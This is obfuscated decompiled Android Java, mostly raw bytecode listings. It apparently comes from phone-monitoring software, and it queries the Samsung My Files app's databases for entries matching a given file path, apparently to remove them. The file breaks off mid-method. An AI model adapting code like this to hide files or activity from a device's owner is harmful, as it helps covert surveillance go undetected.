package com.vvt.q.a.a;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import com.vvt.p.c;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a()
  {
    return "com.sec.android.app.myfiles";
  }
  
  /* Error */
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: new 25	java/util/ArrayList
    //   5: astore 4
    //   7: aload 4
    //   9: invokespecial 29	java/util/ArrayList:<init>	()V
    //   12: iconst_0
    //   13: istore 5
    //   15: aconst_null
    //   16: astore 6
    //   18: aconst_null
    //   19: astore 7
    //   21: aload_0
    //   22: astore 8
    //   24: aload_1
    //   25: astore 9
    //   27: aload_0
    //   28: aload_1
    //   29: aconst_null
    //   30: aconst_null
    //   31: aconst_null
    //   32: aconst_null
    //   33: aconst_null
    //   34: aconst_null
    //   35: invokevirtual 35	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   38: astore 8
    //   40: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   43: istore 10
    //   45: iload 10
    //   47: ifeq +3 -> 50
    //   50: aload 8
    //   52: ifnull +167 -> 219
    //   55: aload 8
    //   57: invokeinterface 41 1 0
    //   62: istore 10
    //   64: iload 10
    //   66: ifle +153 -> 219
    //   69: aload 8
    //   71: invokeinterface 45 1 0
    //   76: istore 10
    //   78: iload 10
    //   80: ifeq +139 -> 219
    //   83: ldc 47
    //   85: astore 9
    //   87: aload 8
    //   89: aload 9
    //   91: invokeinterface 51 2 0
    //   96: istore 10
    //   98: aload 8
    //   100: iload 10
    //   102: invokeinterface 55 2 0
    //   107: lstore 11
    //   109: ldc 57
    //   111: astore 6
    //   113: aload 8
    //   115: aload 6
    //   117: invokeinterface 51 2 0
    //   122: istore 5
    //   124: aload 8
    //   126: iload 5
    //   128: invokeinterface 61 2 0
    //   133: astore 6
    //   135: aload 6
    //   137: ifnull -68 -> 69
    //   140: aload 6
    //   142: invokevirtual 67	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   145: astore 6
    //   147: aload_2
    //   148: invokevirtual 67	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   151: astore 7
    //   153: aload 6
    //   155: aload 7
    //   157: invokevirtual 71	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   160: istore 5
    //   162: iload 5
    //   164: ifeq -95 -> 69
    //   167: lload 11
    //   169: invokestatic 77	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   172: astore 9
    //   174: aload 4
    //   176: aload 9
    //   178: invokeinterface 83 2 0
    //   183: pop
    //   184: goto -115 -> 69
    //   187: astore 9
    //   189: aload 8
    //   191: ifnull +10 -> 201
    //   194: aload 8
    //   196: invokeinterface 86 1 0
    //   201: aload 4
    //   203: areturn
    //   204: astore 8
    //   206: aload_3
    //   207: ifnull +9 -> 216
    //   210: aload_3
    //   211: invokeinterface 86 1 0
    //   216: aload 8
    //   218: athrow
    //   219: aload 8
    //   221: ifnull -20 -> 201
    //   224: goto -30 -> 194
    //   227: astore 9
    //   229: aload 8
    //   231: astore_3
    //   232: aload 9
    //   234: astore 8
    //   236: goto -30 -> 206
    //   239: astore 8
    //   241: aconst_null
    //   242: astore 8
    //   244: goto -55 -> 189
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	247	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	247	1	paramString1	String
    //   0	247	2	paramString2	String
    //   1	231	3	localObject1	Object
    //   5	197	4	localArrayList	java.util.ArrayList
    //   13	114	5	i	int
    //   160	3	5	bool1	boolean
    //   16	138	6	str1	String
    //   19	137	7	str2	String
    //   22	173	8	localObject2	Object
    //   204	26	8	localObject3	Object
    //   234	1	8	localObject4	Object
    //   239	1	8	localSQLiteException1	SQLiteException
    //   242	1	8	localObject5	Object
    //   25	152	9	localObject6	Object
    //   187	1	9	localSQLiteException2	SQLiteException
    //   227	6	9	localObject7	Object
    //   43	3	10	bool2	boolean
    //   62	3	10	j	int
    //   76	3	10	bool3	boolean
    //   96	5	10	k	int
    //   107	61	11	l	long
    // Exception table:
    //   from	to	target	type
    //   40	43	187	android/database/sqlite/SQLiteException
    //   55	62	187	android/database/sqlite/SQLiteException
    //   69	76	187	android/database/sqlite/SQLiteException
    //   89	96	187	android/database/sqlite/SQLiteException
    //   100	107	187	android/database/sqlite/SQLiteException
    //   115	122	187	android/database/sqlite/SQLiteException
    //   126	133	187	android/database/sqlite/SQLiteException
    //   140	145	187	android/database/sqlite/SQLiteException
    //   147	151	187	android/database/sqlite/SQLiteException
    //   155	160	187	android/database/sqlite/SQLiteException
    //   167	172	187	android/database/sqlite/SQLiteException
    //   176	184	187	android/database/sqlite/SQLiteException
    //   34	38	204	finally
    //   40	43	227	finally
    //   55	62	227	finally
    //   69	76	227	finally
    //   89	96	227	finally
    //   100	107	227	finally
    //   115	122	227	finally
    //   126	133	227	finally
    //   140	145	227	finally
    //   147	151	227	finally
    //   155	160	227	finally
    //   167	172	227	finally
    //   176	184	227	finally
    //   34	38	239	android/database/sqlite/SQLiteException
  }
  
  /* Error */
  private static boolean a(Context paramContext, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: iconst_0
    //   5: istore 4
    //   7: aconst_null
    //   8: astore 5
    //   10: ldc 90
    //   12: astore 6
    //   14: aload 6
    //   16: invokestatic 95	com/vvt/n/a:a	(Ljava/lang/String;)Ljava/lang/String;
    //   19: astore 6
    //   21: aload 6
    //   23: ifnull +844 -> 867
    //   26: ldc 90
    //   28: astore 6
    //   30: ldc 97
    //   32: astore 7
    //   34: aload 6
    //   36: aload 7
    //   38: invokestatic 102	com/vvt/p/MyUncaughtExceptionHandler:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 7
    //   43: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   46: istore 8
    //   48: iload 8
    //   50: ifeq +3 -> 53
    //   53: aload 7
    //   55: ifnull +797 -> 852
    //   58: aload 7
    //   60: invokevirtual 105	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   63: istore 8
    //   65: iload 8
    //   67: ifne +15 -> 82
    //   70: aload 7
    //   72: invokevirtual 108	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   75: istore 8
    //   77: iload 8
    //   79: ifeq +46 -> 125
    //   82: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   85: istore 8
    //   87: iload 8
    //   89: ifeq +3 -> 92
    //   92: aload 7
    //   94: ifnull +8 -> 102
    //   97: aload 7
    //   99: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   102: iconst_0
    //   103: ifeq +9 -> 112
    //   106: aconst_null
    //   107: invokeinterface 86 1 0
    //   112: aload 7
    //   114: ifnull +8 -> 122
    //   117: aload 7
    //   119: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   122: iload 4
    //   124: ireturn
    //   125: ldc 111
    //   127: astore 6
    //   129: iconst_3
    //   130: istore 9
    //   132: iload 9
    //   134: anewarray 4	java/lang/Object
    //   137: astore 10
    //   139: iconst_0
    //   140: istore 11
    //   142: aconst_null
    //   143: astore 12
    //   145: ldc 114
    //   147: astore 13
    //   149: aload 10
    //   151: iconst_0
    //   152: aload 13
    //   154: aastore
    //   155: iconst_1
    //   156: istore 11
    //   158: ldc 117
    //   160: astore 13
    //   162: aload 10
    //   164: iload 11
    //   166: aload 13
    //   168: aastore
    //   169: iconst_2
    //   170: istore 11
    //   172: ldc 117
    //   174: astore 13
    //   176: aload 10
    //   178: iload 11
    //   180: aload 13
    //   182: aastore
    //   183: aload 6
    //   185: aload 10
    //   187: invokestatic 122	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   190: astore 6
    //   192: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   195: istore 9
    //   197: iload 9
    //   199: ifeq +3 -> 202
    //   202: iconst_2
    //   203: istore 9
    //   205: iload 9
    //   207: anewarray 63	java/lang/String
    //   210: astore 10
    //   212: iconst_0
    //   213: istore 11
    //   215: aconst_null
    //   216: astore 12
    //   218: ldc 124
    //   220: astore 13
    //   222: aload 10
    //   224: iconst_0
    //   225: aload 13
    //   227: aastore
    //   228: iconst_1
    //   229: istore 11
    //   231: ldc 126
    //   233: astore 13
    //   235: aload 10
    //   237: iload 11
    //   239: aload 13
    //   241: aastore
    //   242: aload 7
    //   244: aload 6
    //   246: aload 10
    //   248: invokevirtual 130	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   251: astore 6
    //   253: aload 6
    //   255: invokeinterface 41 1 0
    //   260: pop
    //   261: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   264: istore 9
    //   266: iload 9
    //   268: ifeq +3 -> 271
    //   271: aload 6
    //   273: ifnull +570 -> 843
    //   276: aload 6
    //   278: invokeinterface 41 1 0
    //   283: istore 9
    //   285: iload 9
    //   287: ifle +556 -> 843
    //   290: new 25	java/util/ArrayList
    //   293: astore 10
    //   295: aload 10
    //   297: invokespecial 29	java/util/ArrayList:<init>	()V
    //   300: aload 6
    //   302: invokeinterface 45 1 0
    //   307: istore 11
    //   309: iload 11
    //   311: ifeq +158 -> 469
    //   314: ldc 47
    //   316: astore 12
    //   318: aload 6
    //   320: aload 12
    //   322: invokeinterface 51 2 0
    //   327: istore 11
    //   329: aload 6
    //   331: iload 11
    //   333: invokeinterface 55 2 0
    //   338: lstore 14
    //   340: ldc -124
    //   342: astore 16
    //   344: aload 6
    //   346: aload 16
    //   348: invokeinterface 51 2 0
    //   353: istore 17
    //   355: aload 6
    //   357: iload 17
    //   359: invokeinterface 61 2 0
    //   364: astore 16
    //   366: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   369: istore 18
    //   371: iload 18
    //   373: ifeq +3 -> 376
    //   376: aload_0
    //   377: aload 16
    //   379: invokestatic 137	com/vvt/q/a/removeFromPath/a:a	(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   382: astore 16
    //   384: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   387: istore 18
    //   389: iload 18
    //   391: ifeq +3 -> 394
    //   394: aload 16
    //   396: ifnull -96 -> 300
    //   399: aload_1
    //   400: aload 16
    //   402: invokevirtual 141	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   405: istore 17
    //   407: iload 17
    //   409: ifeq -109 -> 300
    //   412: lload 14
    //   414: invokestatic 77	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   417: astore 12
    //   419: aload 10
    //   421: aload 12
    //   423: invokeinterface 83 2 0
    //   428: pop
    //   429: goto -129 -> 300
    //   432: astore_3
    //   433: aload 7
    //   435: astore_3
    //   436: getstatic 21	com/vvt/q/a/a/a:MyUncaughtExceptionHandler	Z
    //   439: istore 19
    //   441: iload 19
    //   443: ifeq +3 -> 446
    //   446: aload 6
    //   448: ifnull +10 -> 458
    //   451: aload 6
    //   453: invokeinterface 86 1 0
    //   458: aload_3
    //   459: ifnull -337 -> 122
    //   462: aload_3
    //   463: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   466: goto -344 -> 122
    //   469: ldc 114
    //   471: astore 12
    //   473: aload 7
    //   475: aload 12
    //   477: aload 10
    //   479: invokestatic 144	com/vvt/q/a/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/util/List;)Z
    //   482: istore 9
    //   484: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   487: istore 11
    //   489: iload 11
    //   491: ifeq +3 -> 494
    //   494: aload 6
    //   496: ifnull +16 -> 512
    //   499: aload 6
    //   501: invokeinterface 86 1 0
    //   506: iconst_0
    //   507: istore 8
    //   509: aconst_null
    //   510: astore 6
    //   512: aload 7
    //   514: ifnull +14 -> 528
    //   517: aload 7
    //   519: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   522: iconst_0
    //   523: istore 19
    //   525: aconst_null
    //   526: astore 7
    //   528: ldc 23
    //   530: astore 12
    //   532: aload 12
    //   534: invokestatic 95	com/vvt/n/a:a	(Ljava/lang/String;)Ljava/lang/String;
    //   537: astore 12
    //   539: aload 12
    //   541: ifnull +295 -> 836
    //   544: ldc 23
    //   546: astore 12
    //   548: ldc -110
    //   550: astore 13
    //   552: aload 12
    //   554: aload 13
    //   556: invokestatic 102	com/vvt/p/MyUncaughtExceptionHandler:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   559: astore 7
    //   561: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   564: istore 11
    //   566: iload 11
    //   568: ifeq +3 -> 571
    //   571: aload 7
    //   573: ifnull +263 -> 836
    //   576: aload 7
    //   578: invokevirtual 105	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   581: istore 11
    //   583: iload 11
    //   585: ifne +15 -> 600
    //   588: aload 7
    //   590: invokevirtual 108	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   593: istore 11
    //   595: iload 11
    //   597: ifeq +41 -> 638
    //   600: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   603: istore_2
    //   604: iload_2
    //   605: ifeq +3 -> 608
    //   608: aload 7
    //   610: ifnull +8 -> 618
    //   613: aload 7
    //   615: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   618: aload 6
    //   620: ifnull +10 -> 630
    //   623: aload 6
    //   625: invokeinterface 86 1 0
    //   630: aload 7
    //   632: ifnull -510 -> 122
    //   635: goto -518 -> 117
    //   638: ldc -108
    //   640: astore 5
    //   642: aload 7
    //   644: aload 5
    //   646: aload_1
    //   647: aload_0
    //   648: invokestatic 151	com/vvt/q/a/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Z
    //   651: istore 4
    //   653: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   656: istore 9
    //   658: iload 9
    //   660: ifeq +3 -> 663
    //   663: ldc -103
    //   665: astore 10
    //   667: aload 7
    //   669: aload 10
    //   671: aload_1
    //   672: aload_0
    //   673: invokestatic 151	com/vvt/q/a/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Z
    //   676: istore 4
    //   678: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   681: istore 9
    //   683: iload 9
    //   685: ifeq +3 -> 688
    //   688: aload 7
    //   690: ifnull +14 -> 704
    //   693: aload 7
    //   695: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   698: iconst_0
    //   699: istore 19
    //   701: aconst_null
    //   702: astore 7
    //   704: aload 6
    //   706: ifnull +10 -> 716
    //   709: aload 6
    //   711: invokeinterface 86 1 0
    //   716: aload 7
    //   718: ifnull -596 -> 122
    //   721: goto -604 -> 117
    //   724: astore 5
    //   726: iconst_0
    //   727: istore 8
    //   729: aconst_null
    //   730: astore 6
    //   732: iconst_0
    //   733: istore 19
    //   735: aconst_null
    //   736: astore 7
    //   738: aload 6
    //   740: ifnull +10 -> 750
    //   743: aload 6
    //   745: invokeinterface 86 1 0
    //   750: aload 7
    //   752: ifnull +8 -> 760
    //   755: aload 7
    //   757: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   760: aload 5
    //   762: athrow
    //   763: astore 5
    //   765: iconst_0
    //   766: istore 8
    //   768: aconst_null
    //   769: astore 6
    //   771: goto -33 -> 738
    //   774: astore 5
    //   776: goto -38 -> 738
    //   779: astore 5
    //   781: aload_3
    //   782: astore 7
    //   784: goto -46 -> 738
    //   787: astore 6
    //   789: iconst_0
    //   790: istore 8
    //   792: aconst_null
    //   793: astore 6
    //   795: goto -359 -> 436
    //   798: astore 6
    //   800: iconst_0
    //   801: istore 8
    //   803: aconst_null
    //   804: astore 6
    //   806: aload 7
    //   808: astore_3
    //   809: goto -373 -> 436
    //   812: astore 5
    //   814: aload 7
    //   816: astore_3
    //   817: iload 9
    //   819: istore 4
    //   821: goto -385 -> 436
    //   824: astore 5
    //   826: aload 7
    //   828: astore_3
    //   829: iload 9
    //   831: istore 4
    //   833: goto -397 -> 436
    //   836: iload 9
    //   838: istore 4
    //   840: goto -136 -> 704
    //   843: iconst_0
    //   844: istore 9
    //   846: aconst_null
    //   847: astore 10
    //   849: goto -355 -> 494
    //   852: iconst_0
    //   853: istore 8
    //   855: aconst_null
    //   856: astore 6
    //   858: iconst_0
    //   859: istore 9
    //   861: aconst_null
    //   862: astore 10
    //   864: goto -336 -> 528
    //   867: iconst_0
    //   868: istore 8
    //   870: aconst_null
    //   871: astore 6
    //   873: iconst_0
    //   874: istore 19
    //   876: aconst_null
    //   877: astore 7
    //   879: iconst_0
    //   880: istore 9
    //   882: aconst_null
    //   883: astore 10
    //   885: goto -357 -> 528
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	888	0	paramContext	Context
    //   0	888	1	paramString	String
    //   1	604	2	bool1	boolean
    //   3	1	3	localObject1	Object
    //   432	1	3	localException1	Exception
    //   435	394	3	localObject2	Object
    //   5	834	4	bool2	boolean
    //   8	637	5	str1	String
    //   724	37	5	localObject3	Object
    //   763	1	5	localObject4	Object
    //   774	1	5	localObject5	Object
    //   779	1	5	localObject6	Object
    //   812	1	5	localException2	Exception
    //   824	1	5	localException3	Exception
    //   12	758	6	localObject7	Object
    //   787	1	6	localException4	Exception
    //   793	1	6	localObject8	Object
    //   798	1	6	localException5	Exception
    //   804	68	6	localObject9	Object
    //   32	846	7	localObject10	Object
    //   46	823	8	bool3	boolean
    //   130	3	9	i	int
    //   195	3	9	bool4	boolean
    //   203	3	9	j	int
    //   264	3	9	bool5	boolean
    //   283	3	9	k	int
    //   482	399	9	bool6	boolean
    //   137	747	10	localObject11	Object
    //   140	98	11	m	int
    //   307	3	11	bool7	boolean
    //   327	5	11	n	int
    //   487	109	11	bool8	boolean
    //   143	410	12	localObject12	Object
    //   147	408	13	str2	String
    //   338	75	14	l	long
    //   342	59	16	str3	String
    //   353	5	17	i1	int
    //   405	3	17	bool9	boolean
    //   369	21	18	bool10	boolean
    //   439	436	19	bool11	boolean
    // Exception table:
    //   from	to	target	type
    //   253	261	432	java/lang/Exception
    //   261	264	432	java/lang/Exception
    //   276	283	432	java/lang/Exception
    //   290	293	432	java/lang/Exception
    //   295	300	432	java/lang/Exception
    //   300	307	432	java/lang/Exception
    //   320	327	432	java/lang/Exception
    //   331	338	432	java/lang/Exception
    //   346	353	432	java/lang/Exception
    //   357	364	432	java/lang/Exception
    //   366	369	432	java/lang/Exception
    //   377	382	432	java/lang/Exception
    //   384	387	432	java/lang/Exception
    //   400	405	432	java/lang/Exception
    //   412	417	432	java/lang/Exception
    //   421	429	432	java/lang/Exception
    //   477	482	432	java/lang/Exception
    //   653	656	432	java/lang/Exception
    //   672	676	432	java/lang/Exception
    //   678	681	432	java/lang/Exception
    //   693	698	432	java/lang/Exception
    //   14	19	724	finally
    //   36	41	724	finally
    //   43	46	763	finally
    //   58	63	763	finally
    //   70	75	763	finally
    //   82	85	763	finally
    //   97	102	763	finally
    //   132	137	763	finally
    //   152	155	763	finally
    //   166	169	763	finally
    //   180	183	763	finally
    //   185	190	763	finally
    //   192	195	763	finally
    //   205	210	763	finally
    //   225	228	763	finally
    //   239	242	763	finally
    //   246	251	763	finally
    //   253	261	774	finally
    //   261	264	774	finally
    //   276	283	774	finally
    //   290	293	774	finally
    //   295	300	774	finally
    //   300	307	774	finally
    //   320	327	774	finally
    //   331	338	774	finally
    //   346	353	774	finally
    //   357	364	774	finally
    //   366	369	774	finally
    //   377	382	774	finally
    //   384	387	774	finally
    //   400	405	774	finally
    //   412	417	774	finally
    //   421	429	774	finally
    //   477	482	774	finally
    //   484	487	774	finally
    //   499	506	774	finally
    //   517	522	774	finally
    //   532	537	774	finally
    //   554	559	774	finally
    //   561	564	774	finally
    //   576	581	774	finally
    //   588	593	774	finally
    //   600	603	774	finally
    //   613	618	774	finally
    //   647	651	774	finally
    //   653	656	774	finally
    //   672	676	774	finally
    //   678	681	774	finally
    //   693	698	774	finally
    //   436	439	779	finally
    //   14	19	787	java/lang/Exception
    //   36	41	787	java/lang/Exception
    //   43	46	798	java/lang/Exception
    //   58	63	798	java/lang/Exception
    //   70	75	798	java/lang/Exception
    //   82	85	798	java/lang/Exception
    //   97	102	798	java/lang/Exception
    //   132	137	798	java/lang/Exception
    //   152	155	798	java/lang/Exception
    //   166	169	798	java/lang/Exception
    //   180	183	798	java/lang/Exception
    //   185	190	798	java/lang/Exception
    //   192	195	798	java/lang/Exception
    //   205	210	798	java/lang/Exception
    //   225	228	798	java/lang/Exception
    //   239	242	798	java/lang/Exception
    //   246	251	798	java/lang/Exception
    //   484	487	812	java/lang/Exception
    //   499	506	824	java/lang/Exception
    //   517	522	824	java/lang/Exception
    //   532	537	824	java/lang/Exception
    //   554	559	824	java/lang/Exception
    //   561	564	824	java/lang/Exception
    //   576	581	824	java/lang/Exception
    //   588	593	824	java/lang/Exception
    //   600	603	824	java/lang/Exception
    //   613	618	824	java/lang/Exception
    //   647	651	824	java/lang/Exception
  }
  
  /* Error */
  private static boolean a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, Context paramContext)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aload_0
    //   4: ifnull +623 -> 627
    //   7: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   10: istore 5
    //   12: iload 5
    //   14: ifeq +3 -> 17
    //   17: ldc -99
    //   19: astore 6
    //   21: ldc -97
    //   23: astore 7
    //   25: aconst_null
    //   26: astore 8
    //   28: iconst_0
    //   29: istore 9
    //   31: aconst_null
    //   32: astore 10
    //   34: iconst_0
    //   35: istore 11
    //   37: aconst_null
    //   38: astore 12
    //   40: iconst_0
    //   41: istore 13
    //   43: aconst_null
    //   44: astore 14
    //   46: iconst_0
    //   47: istore 15
    //   49: aconst_null
    //   50: astore 16
    //   52: iconst_0
    //   53: istore 17
    //   55: ldc -95
    //   57: astore 18
    //   59: aload_0
    //   60: astore 19
    //   62: aload_1
    //   63: astore 20
    //   65: aload_0
    //   66: aload_1
    //   67: aconst_null
    //   68: aconst_null
    //   69: aconst_null
    //   70: aconst_null
    //   71: aconst_null
    //   72: aconst_null
    //   73: aload 18
    //   75: invokevirtual 164	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   78: astore 19
    //   80: aload 19
    //   82: ifnull +534 -> 616
    //   85: ldc -90
    //   87: astore 20
    //   89: aload 19
    //   91: aload 20
    //   93: invokeinterface 51 2 0
    //   98: istore 21
    //   100: iload 21
    //   102: iflt +507 -> 609
    //   105: ldc -90
    //   107: astore 8
    //   109: ldc -88
    //   111: astore 20
    //   113: aload 19
    //   115: aload 20
    //   117: invokeinterface 51 2 0
    //   122: istore 21
    //   124: iload 21
    //   126: iflt +476 -> 602
    //   129: ldc -88
    //   131: astore 20
    //   133: aload 19
    //   135: ifnull +10 -> 145
    //   138: aload 19
    //   140: invokeinterface 86 1 0
    //   145: aload 20
    //   147: astore 22
    //   149: aload 8
    //   151: astore 20
    //   153: aload 22
    //   155: astore 8
    //   157: ldc -86
    //   159: astore 10
    //   161: iconst_2
    //   162: istore 11
    //   164: iload 11
    //   166: anewarray 4	java/lang/Object
    //   169: astore 12
    //   171: iconst_0
    //   172: istore 13
    //   174: aconst_null
    //   175: astore 14
    //   177: aload 12
    //   179: iconst_0
    //   180: aload_1
    //   181: aastore
    //   182: iconst_1
    //   183: istore 13
    //   185: aload 12
    //   187: iload 13
    //   189: aload 20
    //   191: aastore
    //   192: aload 10
    //   194: aload 12
    //   196: invokestatic 122	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   199: astore 20
    //   201: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   204: istore 9
    //   206: iload 9
    //   208: ifeq +3 -> 211
    //   211: iconst_1
    //   212: istore 9
    //   214: iload 9
    //   216: anewarray 63	java/lang/String
    //   219: astore 10
    //   221: iconst_0
    //   222: istore 11
    //   224: aconst_null
    //   225: astore 12
    //   227: ldc -84
    //   229: astore 14
    //   231: aload 10
    //   233: iconst_0
    //   234: aload 14
    //   236: aastore
    //   237: aload_0
    //   238: aload 20
    //   240: aload 10
    //   242: invokevirtual 130	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   245: astore 20
    //   247: aload 20
    //   249: invokeinterface 41 1 0
    //   254: pop
    //   255: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   258: istore 5
    //   260: iload 5
    //   262: ifeq +3 -> 265
    //   265: aload 20
    //   267: ifnull +326 -> 593
    //   270: aload 20
    //   272: invokeinterface 41 1 0
    //   277: istore 5
    //   279: iload 5
    //   281: ifle +312 -> 593
    //   284: new 25	java/util/ArrayList
    //   287: astore 10
    //   289: aload 10
    //   291: invokespecial 29	java/util/ArrayList:<init>	()V
    //   294: aload 20
    //   296: invokeinterface 45 1 0
    //   301: istore 5
    //   303: iload 5
    //   305: ifeq +203 -> 508
    //   308: ldc 47
    //   310: astore 19
    //   312: aload 20
    //   314: aload 19
    //   316: invokeinterface 51 2 0
    //   321: istore 5
    //   323: aload 20
    //   325: iload 5
    //   327: invokeinterface 55 2 0
    //   332: lstore 23
    //   334: aload 20
    //   336: aload 8
    //   338: invokeinterface 51 2 0
    //   343: istore 5
    //   345: aload 20
    //   347: iload 5
    //   349: invokeinterface 61 2 0
    //   354: astore 16
    //   356: ldc -124
    //   358: astore 19
    //   360: aload 20
    //   362: aload 19
    //   364: invokeinterface 51 2 0
    //   369: istore 5
    //   371: aload 20
    //   373: iload 5
    //   375: invokeinterface 61 2 0
    //   380: astore 19
    //   382: aload 19
    //   384: aload 16
    //   386: invokevirtual 175	java/lang/String:endsWith	(Ljava/lang/String;)Z
    //   389: istore 17
    //   391: iload 17
    //   393: ifne +12 -> 405
    //   396: aload 19
    //   398: aload 16
    //   400: invokestatic 180	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   403: astore 19
    //   405: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   408: istore 15
    //   410: iload 15
    //   412: ifeq +3 -> 415
    //   415: aload_3
    //   416: aload 19
    //   418: invokestatic 137	com/vvt/q/a/removeFromPath/a:a	(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   421: astore 19
    //   423: getstatic 13	com/vvt/q/a/a/a:a	Z
    //   426: istore 15
    //   428: iload 15
    //   430: ifeq +3 -> 433
    //   433: aload 19
    //   435: ifnull -141 -> 294
    //   438: aload_2
    //   439: aload 19
    //   441: invokevirtual 141	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   444: istore 5
    //   446: iload 5
    //   448: ifeq -154 -> 294
    //   451: lload 23
    //   453: invokestatic 77	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   456: astore 19
    //   458: aload 10
    //   460: aload 19
    //   462: invokeinterface 83 2 0
    //   467: pop
    //   468: goto -174 -> 294
    //   471: astore 19
    //   473: aload 20
    //   475: astore 19
    //   477: getstatic 21	com/vvt/q/a/a/a:MyUncaughtExceptionHandler	Z
    //   480: istore 21
    //   482: iload 21
    //   484: ifeq +3 -> 487
    //   487: aload 19
    //   489: ifnull +10 -> 499
    //   492: aload 19
    //   494: invokeinterface 86 1 0
    //   499: iconst_0
    //   500: istore 5
    //   502: aconst_null
    //   503: astore 19
    //   505: iload 5
    //   507: ireturn
    //   508: aload_0
    //   509: aload_1
    //   510: aload 10
    //   512: invokestatic 144	com/vvt/q/a/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/util/List;)Z
    //   515: istore 4
    //   517: iload 4
    //   519: istore 5
    //   521: aload 20
    //   523: ifnull -18 -> 505
    //   526: aload 20
    //   528: invokeinterface 86 1 0
    //   533: goto -28 -> 505
    //   536: astore 19
    //   538: iconst_0
    //   539: istore 21
    //   541: aconst_null
    //   542: astore 20
    //   544: aload 20
    //   546: ifnull +10 -> 556
    //   549: aload 20
    //   551: invokeinterface 86 1 0
    //   556: aload 19
    //   558: athrow
    //   559: astore 22
    //   561: aload 19
    //   563: astore 20
    //   565: aload 22
    //   567: astore 19
    //   569: goto -25 -> 544
    //   572: astore 19
    //   574: goto -30 -> 544
    //   577: astore 19
    //   579: iconst_0
    //   580: istore 5
    //   582: aconst_null
    //   583: astore 19
    //   585: goto -108 -> 477
    //   588: astore 20
    //   590: goto -113 -> 477
    //   593: iconst_0
    //   594: istore 5
    //   596: aconst_null
    //   597: astore 19
    //   599: goto -78 -> 521
    //   602: aload 7
    //   604: astore 20
    //   606: goto -473 -> 133
    //   609: aload 6
    //   611: astore 8
    //   613: goto -504 -> 109
    //   616: aload 7
    //   618: astore 8
    //   620: aload 6
    //   622: astore 20
    //   624: goto -467 -> 157
    //   627: iconst_0
    //   628: istore 5
    //   630: aconst_null
